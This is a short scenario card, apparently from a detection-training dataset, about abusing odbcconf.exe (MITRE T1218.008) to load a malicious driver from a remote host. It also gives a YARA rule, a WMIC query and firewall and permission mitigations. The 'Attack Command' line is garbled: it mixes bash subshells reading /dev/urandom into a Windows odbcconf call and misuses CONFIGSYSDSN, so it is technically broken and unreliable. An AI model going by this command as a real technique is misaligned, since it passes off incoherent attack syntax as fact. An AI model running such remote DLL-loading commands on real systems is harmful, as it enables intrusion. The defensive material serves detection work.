---
type: campaign
scenario_id: 182
tactic: Defense Evasion
technique: "T1218.008: Odbcconf"
technique_id: T1218.008
tags: [campaign, lotl, defense_evasion]
---

# Using odbcconf.exe to execute malicious driver remotely.

## Threat Description
Using odbcconf.exe to execute malicious driver remotely.

## Attack Command
```
odbcconf /S /A {CONFIGSYSDSN "$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com"}
```

## Detection Logic
Monitor odbcconf remote: `wmic process where name='odbcconf.exe' get commandline | findstr http`; YARA rule: `rule OdbcconfRemote { strings: $a = /odbcconf.*http.*dll/ nocase; condition: $a }`.

## Mitigation
Restrict odbcconf: `icacls %windir%\System32\odbcconf.exe /deny Everyone:RX`; Block driver downloads: `netsh advfirewall firewall add rule name='Block odbcconf' dir=out program='%windir%\System32\odbcconf.exe' action=block`.

## AI Training Prompt
Train AI to detect odbcconf remote driver execution and suggest firewall rules.

## References
- MITRE ATT&CK T1218.008: https://attack.mitre.org/techniques/T1218/008/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
